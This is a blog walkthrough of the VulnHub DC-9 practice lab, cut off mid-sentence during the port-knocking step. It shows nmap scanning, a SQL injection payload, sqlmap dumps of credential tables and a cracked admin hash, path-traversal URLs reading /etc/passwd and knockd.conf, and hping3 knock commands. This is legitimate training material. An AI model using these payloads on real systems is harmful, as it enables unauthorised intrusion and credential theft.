@@ -1,0 +1,625 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="DC: 9" /><meta name="author" content="Hummus_Ful" /><meta property="og:locale" content="en_US" /><meta name="description" content="DC-9 is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. The goal of this challenge is to get root and to read the one and only flag." /><meta property="og:description" content="DC-9 is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. The goal of this challenge is to get root and to read the one and only flag." /><link rel="canonical" href="https://hummus-ful.github.io/vulnhub/2021/01/22/DC-9.html" /><meta property="og:url" content="https://hummus-ful.github.io/vulnhub/2021/01/22/DC-9.html" /><meta property="og:site_name" content="Hacking Walkthroughs, Writeups and Guides" /><meta property="og:image" content="https://hummus-ful.github.io/assets/img/posts/dc-9/DC-9.webp" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-22T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://hummus-ful.github.io/assets/img/posts/dc-9/DC-9.webp" /><meta property="twitter:title" content="DC: 9" /><meta name="twitter:site" content="@Hummus_Ful" /><meta name="twitter:creator" content="@Hummus_Ful" /><meta name="google-site-verification" content="P3Rh-XrKLkBVXTQO6pVa9j7IMMHzGZ_n_ohonooVTc8" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Hummus_Ful"},"description":"DC-9 is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. The goal of this challenge is to get root and to read the one and only flag.","url":"https://hummus-ful.github.io/vulnhub/2021/01/22/DC-9.html","image":"https://hummus-ful.github.io/assets/img/posts/dc-9/DC-9.webp","@type":"BlogPosting","headline":"DC: 9","dateModified":"2021-01-27T23:31:53+02:00","datePublished":"2021-01-22T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://hummus-ful.github.io/vulnhub/2021/01/22/DC-9.html"},"@context":"https://schema.org"}</script><title>DC: 9 | Hacking Walkthroughs, Writeups and Guides</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/hf.webp" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacking Walkthroughs, Writeups and Guides</a></div><div class="site-subtitle font-italic">Learn Something New Every Day</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Hummus-Ful" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Hummus_Ful" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.buymeacoffee.com/Hummus.Ful" aria-label="bmc" > <i class="fas fa-hand-holding-heart"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>DC: 9</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>DC: 9</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 22, 2021, 12:00 AM +0200" > Jan 22 <i class="unloaded">2021-01-22T00:00:00+02:00</i> </span> by <span class="author"> Hummus_Ful </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Jan 27, 2021, 11:31 PM +0200" > Jan 27 <i class="unloaded">2021-01-27T23:31:53+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3570 words">17 min</span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/dc-9/DC-9.webp" class="preview-img"><p>DC-9 is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.<br /> The goal of this challenge is to get root and to read the one and only flag.<br /></p><h1 id="introduction">Introduction</h1><p>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.<br /> The ultimate goal of this challenge is to get root and to read the one and only flag.<br /> Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.<br /> For beginners, Google can be of great assistance, but the machine’s creator encurage you to contact him using Twitter at <a href="https://twitter.com/DCAU7">@DCAU7</a> for assistance to get you going again.<br /> It was created by <a href="https://www.vulnhub.com/author/dcau,610/">DCAU</a><br /> Other machines in the series can be found <a href="https://www.vulnhub.com/series/dc,199/">here</a></p><h1 id="prerequisites">Prerequisites</h1><h2 id="kali-linux--parrot-security-os">Kali Linux / Parrot Security OS</h2><p>The virtual machine we’ll use to source the attack vectors against the DC-9 virtual machine. These Linux distribution has all required tools pre-installed. Choose one of them.</p><ul><li>Kali Linux VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox <br /> from <a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">Offensive-Security</a><li>Parrot Security VM (based on Arch distribution with different desktop flavors) can be downloaded <br /> from <a href="https://www.parrotsec.org/download/">https://www.parrotsec.org/download/</a></ul><h2 id="dc-9-vulnerable-machine">DC: 9 Vulnerable Machine</h2><p>Download the virtual machine from <a href="https://www.vulnhub.com/entry/dc-9,412/">Vulnhub</a>, start it and give it a couple of minutes to boot.</p><h2 id="dedicated-directory">Dedicated Directory</h2><p>We need to create a dedicated directory in our home directory <code class="language-console highlighter-rouge"><span class="go">~</span></code> for our findings. We’ll use <code class="language-console highlighter-rouge"><span class="go">mkdir</span></code> and <code class="language-console highlighter-rouge"><span class="go">cd</span></code> (change directory) into it:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">mkdir</span> ~/vulnhub/dc9
+<span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> ~/vulnhub/dc9/
+</pre></table></code></div></div><h2 id="verify-our-ip-address">Verify our IP address</h2><p>We need to verify our IP address. We’ll use the <code class="language-console highlighter-rouge"><span class="go">ip addr</span></code> command to list all interfaces on our machine:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ip addr                                   
+<span class="gp">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt;</span><span class="w"> </span>mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+<span class="go">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+</span><span class="gp">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span><span class="w"> </span>mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+<span class="go">    link/ether 08:00:27:ab:08:1c brd ff:ff:ff:ff:ff:ff
+    inet 10.0.0.12/24 brd 10.0.0.255 scope global dynamic noprefixroute eth0
+       valid_lft 305sec preferred_lft 305sec
+    inet6 fe80::a00:27ff:feab:81c/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+</span></pre></table></code></div></div><p>In this example, the machine’s IP is <strong>10.0.0.12</strong> - as you can see under <code class="language-console highlighter-rouge"><span class="go">eth0</span></code> section, which is my network interface. Your IP might be different and the network interface might be called <code class="language-console highlighter-rouge"><span class="go">wlan0</span></code> for example.</p><h1 id="scanning">Scanning</h1><h2 id="nmap">nmap</h2><p>We first need to discover the machine’s IP. We’ll use a scan called <strong>Ping Sweep</strong> which will use ICMP ECHO packet to discover online hosts, without conducting further port scanning on each of the discovered host. <a href="https://nmap.org/">nmap</a> flag for such command is <code class="language-console highlighter-rouge"><span class="go">-sn</span></code>. The complete command is: <code class="language-console highlighter-rouge"><span class="go">sudo nmap -sn 10.0.0.0/24</span></code> where we scan the whole 254 usable IPs in the 10.0.0.0 network:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sn</span> 10.0.0.0/24
+<span class="c">...
+</span><span class="go">MAC Address: 08:00:27:33:60:F0 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 10.0.0.14
+Host is up (0.00051s latency).
+MAC Address: 08:00:27:51:67:14 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 10.0.0.12
+Host is up.
+</span><span class="c">...
+</span></pre></table></code></div></div><p>According to the above results, our target’s IP is <strong>10.0.0.14</strong>.</p><h2 id="add-ip-to-hosts-file-optional">Add IP to hosts file [OPTIONAL]</h2><p>For better readability and as I don’t want to try and remember the target’d IP, I’ll add the machine’s IP to my local <code class="language-console highlighter-rouge"><span class="go">/etc/hosts</span></code> file:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nano /etc/hosts
+<span class="go">
+127.0.0.1       localhost
+127.0.1.1       kali
+10.0.0.14       dc9
+</span><span class="c">...
+</span></pre></table></code></div></div><p>Now we can use the ‘<strong>dc9</strong>’ hostname instead of the IP in all the commands.</p><h2 id="back-to-nmap">Back to nmap</h2><p>Time to run a full TCP-SYN scan to scan for open TCP ports on the target:<br /> <code class="language-console highlighter-rouge"><span class="go">sudo nmap dc9 -sV -p- -O -T4 -oN nmap</span></code></p><ul><li><code class="language-console highlighter-rouge"><span class="go">-sV</span></code> determine service/version info<li><code class="language-console highlighter-rouge"><span class="go">-T4</span></code> for faster execution<li><code class="language-console highlighter-rouge"><span class="go">-p-</span></code> scan all ports<li><code class="language-console highlighter-rouge"><span class="go">-O</span></code> identify Operating System<li><code class="language-console highlighter-rouge"><span class="go">-oN</span></code> output to file, in our case it’s called nmap</ul><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap dc9
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-18 15:37 EST
+Nmap scan report for 10.0.0.14
+Host is up (0.00056s latency).
+Not shown: 65533 closed ports
+PORT   STATE    SERVICE VERSION
+22/tcp filtered ssh
+80/tcp open     http    Apache httpd 2.4.38 ((Debian))
+MAC Address: 08:00:27:51:67:14 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+</span><span class="c">...
+</span></pre></table></code></div></div><p>That filterd port looks intresting and might point out to <a href="https://en.wikipedia.org/wiki/Port_knocking">Port Knocking</a> method being used.</p><p>I’ve searched for any known vulnerabilities in any of the services listed above yet came up empty.</p><h1 id="gaining-access">Gaining Access</h1><h2 id="sqli-and-sqlmap">SQLi and sqlmap</h2><p>Crawling through the web application I’ve found the <strong>search</strong> form which seems to be vulnerable to <a href="https://en.wikipedia.org/wiki/SQL_injection">SQL Injection (SQLi) attack</a> as when I used the <code class="language-console highlighter-rouge"><span class="go">' or '1'='1</span></code> payload, the web application returned <strong>all</strong> records.</p><p>The best tool we can use in order to leverage SQLi autmation is <a href="http://sqlmap.org/">sqlmap</a>.</p><dl><dt>Note:<dd>I’ll skip the part how you should configure Burp to intercept requests. You can find a detailed tutorial on the <a href="https://portswigger.net/burp/documentation/desktop/getting-started">official PortSwigger documentation</a></dl><p>First we need to capture the vulnerable request using <a href="https://tools.kali.org/web-applications/burpsuite">Burp</a>/<a href="https://tools.kali.org/web-applications/zaproxy">ZAP</a> and save it into a file</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/dc-9/dc-9_intercept-request.webp" alt="DC-9 intercept request" /> <em>Intercept request and save to file</em></p><p>Now we can launch <code class="language-console highlighter-rouge"><span class="go">sqlmap</span></code>, provide the file we just saved (I named it <em>search_request.txt</em>) and the <code class="language-console highlighter-rouge"><span class="go">--dbs</span></code> flag to scan for avaialble databases.<br /> <code class="language-console highlighter-rouge"><span class="go">sqlmap -r search_request.txt --dbs</span></code></p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> search_form.txt <span class="nt">--dbs</span>
+<span class="c">...
+</span><span class="go">[16:18:06] [INFO] fetching database names
+available databases [3]:
+[*] information_schema
+[*] Staff
+[*] users
+</span><span class="c">...
+</span></pre></table></code></div></div><p>Using sqlmap we were able to find two databases that might be interesting:</p><ol><li>Staff<li>users</ol><p>Let’s discover all <strong>tables</strong> in all databases (we’ll disregard the schema db output)</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> search_form.txt <span class="nt">--tables</span>
+<span class="c">...
+</span><span class="go">Database: Staff
+[2 tables]
++---------------------------------------+
+| StaffDetails                          |
+| Users                                 |
++---------------------------------------+
+
+Database: users
+[1 table]
++---------------------------------------+
+| UserDetails                           |
++---------------------------------------+
+</span><span class="c">...
+</span></pre></table></code></div></div><p>Now let’s pull each of the table’s <strong>columns</strong>:<br /> For <em>Staff</em> database:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> search_form.txt <span class="nt">--columns</span> <span class="nt">-D</span> Staff
+<span class="c">...
+</span><span class="go">[16:41:48] [INFO] fetching tables for database: 'Staff'
+[16:41:48] [INFO] fetching columns for table 'StaffDetails' in database 'Staff'
+[16:41:48] [INFO] fetching columns for table 'Users' in database 'Staff'
+Database: Staff
+Table: StaffDetails
+[7 columns]
++-----------+-----------------+
+| Column    | Type            |
++-----------+-----------------+
+| position  | varchar(100)    |
+| email     | varchar(50)     |
+| firstname | varchar(30)     |
+| id        | int(6) unsigned |
+| lastname  | varchar(30)     |
+| phone     | varchar(20)     |
+| reg_date  | timestamp       |
++-----------+-----------------+
+
+Database: Staff
+Table: Users
+[3 columns]
++----------+-----------------+
+| Column   | Type            |
++----------+-----------------+
+| Password | varchar(255)    |
+| UserID   | int(6) unsigned |
+| Username | varchar(255)    |
++----------+-----------------+
+</span><span class="c">...
+</span></pre></table></code></div></div><p>For <em>users</em> database:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> search_form.txt <span class="nt">--columns</span> <span class="nt">-D</span> <span class="nb">users</span>
+<span class="c">...
+</span><span class="go">[16:45:15] [INFO] fetching tables for database: 'users'
+[16:45:15] [INFO] fetching columns for table 'UserDetails' in database 'users'
+Database: users
+Table: UserDetails
+[6 columns]
++-----------+-----------------+
+| Column    | Type            |
++-----------+-----------------+
+| firstname | varchar(30)     |
+| id        | int(6) unsigned |
+| lastname  | varchar(30)     |
+| password  | varchar(20)     |
+| reg_date  | timestamp       |
+| username  | varchar(30)     |
++-----------+-----------------+
+</span><span class="c">...
+</span></pre></table></code></div></div><p>Last thing, we can also <strong>dump</strong> the data from these tables.<br /> For <em>users</em> database:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> search_form.txt <span class="nt">--dump</span> <span class="nt">-D</span> <span class="nb">users</span> <span class="nt">-T</span> UserDetails
+<span class="c">...
+</span><span class="go">[16:48:21] [INFO] fetching columns for table 'UserDetails' in database 'users'
+[16:48:21] [INFO] fetching entries for table 'UserDetails' in database 'users'
+Database: users
+Table: UserDetails
+[17 entries]
++----+------------+---------------+---------------------+-----------+-----------+
+| id | lastname   | password      | reg_date            | username  | firstname |
++----+------------+---------------+---------------------+-----------+-----------+
+| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
+| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
+| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
+| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
+| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
+</span><span class="gp">| 6  | Mouse      | B8m#</span>48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
+<span class="go">| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
+| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
+| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
+| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
+</span><span class="gp">| 11 | Green      | yN72#</span>dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
+<span class="go">| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
+| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
+| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
+| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
+| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
+| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
++----+------------+---------------+---------------------+-----------+-----------+
+</span><span class="c">...
+</span></pre></table></code></div></div><p>For <em>Staff</em> database:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> search_form.txt <span class="nt">--dump</span> <span class="nt">-D</span> Staff <span class="nt">-T</span> Users      
+<span class="c">...
+</span><span class="go">[16:51:04] [INFO] fetching columns for table 'Users' in database 'Staff'
+[16:51:04] [INFO] fetching entries for table 'Users' in database 'Staff'
+[16:51:04] [INFO] recognized possible password hashes in column 'Password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[16:51:23] [INFO] writing hashes to a temporary file '/tmp/sqlmapr53w8u1p5379/sqlmaphashes-wm8yf7ks.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+[16:51:34] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+</span><span class="gp">&gt;</span><span class="w"> </span>1
+<span class="go">[16:51:42] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[16:51:52] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[16:51:52] [INFO] starting 2 processes 
+[16:52:06] [WARNING] no clear password(s) found                                                                                                  
+
+Database: Staff
+Table: Users
+[1 entry]
++--------+----------------------------------+----------+
+| UserID | Password                         | Username |
++--------+----------------------------------+----------+
+| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
++--------+----------------------------------+----------+
+</span><span class="c">...
+</span></pre></table></code></div></div><p>See the last table? it contains a clear-text username and a <a href="https://auth0.com/blog/hashing-passwords-one-way-road-to-security/">hashed password</a>, even sqlmap recognized it as MD5.<br /> We can use <a href="https://crackstation.net/">crackstation</a> to crack this hash or use john but it seems the password is missing from any of the wordlists I tried.<br /> The clear password is <code class="language-console highlighter-rouge"><span class="go">transorbital1</span></code>.</p><dl><dt>Note:<dd>sqlmap can crack that password as well, you only need to mark YES once sqlmap propt if to <em>use common password suffixes</em></dl><p>Now that we have a username:password combination we can use it to login to the web application.<br /> Once logged in as <strong>admin</strong> we have additional tabs and capabilities we can use. Looking around I found nothing intresting, but that “File does not exist” at the page footer looks intresting though.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/dc-9/dc-9_admin-panel.webp" alt="DC-9 Admin panel" /> <em>Admin panel</em></p><p>Using Google I found it might indicate the web application is trying to load a file from the server (our target) file system which means we might be able to exploit a <a href="https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/">Local File Inclusion</a> vulnerability.<br /> I got a bit lost here and it took me some time to understand we need to add the <code class="language-console highlighter-rouge"><span class="go">?file=</span></code> parameter to the URL and not a <code class="language-console highlighter-rouge"><span class="go">?page=</span></code>.<br /> Now we can try to load known Linux files (such as <em>/etc/passwd</em>) using the parameter. As we don’t know the exact directory level we’re in, we can use many <code class="language-console highlighter-rouge"><span class="go">../</span></code> which means we’ll go up the directories untill we reach <code class="language-console highlighter-rouge"><span class="go">/</span></code>. Therefore the URL is:<br /> <code class="language-console highlighter-rouge"><span class="go">http://dc9/manage.php?file=../../../../../../../etc/passwd</span></code> which prints the <em>/etc/passwd</em> content to the footer:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/dc-9/dc-9_local-file-inclusion-passwd.webp" alt="DC-9 LFI printing the content of /etc/passwd" /> <em>LFI printing the content of /etc/passwd</em></p><h2 id="port-knocking">Port knocking</h2><p>Remember the filtered SSH port which might indicated a Port Knocking method is used? As we now have access to the file system of our target, we can try to locate the <em>knockd.conf</em> configuration file located by default at <em>/etc/</em> folder. This means our URL should be:<br /> <code class="language-console highlighter-rouge"><span class="go">http://dc9/welcome.php?file=../../../../../../../../etc/knockd.conf</span></code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/dc-9/dc-9_port-knocking-conf-file.webp" alt="DC-9 port-knocking configuration file" /> <em>knockd configuration file</em></p><p>Now we know the order of ports we need to hit with SYN packets in order to open the SSH port - 7469,8475 and lastly 9842 port. Keep in mind the order is important!<br /> We can use on of the follwoing methods:</p><ol><li><a href="https://linux.die.net/man/1/knockd">knockd</a> - Need to be installed.<li><a href="https://tools.kali.org/information-gathering/hping3">hping3</a> - pre-instlled on Kali. Use the following command to send 1 SYN packet to each port: <code class="language-console highlighter-rouge"><span class="gp">hping3 -S 10.0.0.235 -p 7469 -c 1;</span><span class="w"> </span>hping3 <span class="nt">-S</span> 10.0.0.235 <span class="nt">-p</span> 8475 <span class="nt">-c</span> 1<span class="p">;</span> hping3 <span class="nt">-S</span> 10.0.0.235 <span class="nt">-p</span> 9842 <span class="nt">-c</span> 1</code><li><a href="https://en.wikipedia.org/wiki/Netcat">netcat</a> - I’ll use this method as it is (manual but) easy.<br /> We need to hit the port and CTRL+C in order to end the connection and move over to 